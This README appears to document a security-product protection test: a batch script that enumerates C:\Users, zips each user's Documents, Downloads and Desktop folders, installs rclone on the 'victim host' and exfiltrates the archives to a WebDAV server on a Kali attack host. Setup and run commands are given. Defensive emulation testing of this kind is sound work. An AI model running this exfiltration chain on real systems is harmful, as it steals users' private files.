# Protections Test 1

This protections test batch script tests blocking enumeration and exfiltration via rclone.

## Usage

The batch script takes the webdav server URL as an argument.

* From your Kali attack host `kali (x.x.x.x)`, open a new terminal tab to setup the `rclone` server to receive the exfiltrated files:

    ```cmd
    sudo rclone serve webdav /srv/http --addr x.x.x.x:x
    ```

* Open Administrator Command Prompt, and run the batch script

    ```cmd
    C:\Windows\Temp\test1.bat http://x.x.x.x:x
    ```

## Features
* Takes the webdav server URL as an argument
* Enumerates files in the `C:\Users` directory
* Zips the Documents, Downloads, & Desktops directories for each user
* Downloads and configures rclone on the victim host
* Exfiltrates the zip files to the webdav server via rclone

## Logging

For operator usability, the test1 batch script will log it activity in plaintext in `Test1Log.txt` in the current working directory.

## Cleanup

Run the cleanup script for `test1.bat` located in `../protections/test1` from the same directory you run `test1.bat`:

```cmd
.\cleanup_test1.bat
```

## Troubleshooting
* Ensure the webdav server has been started on your Kali host
* Review the log file `Test1Log.txt` for any error messages
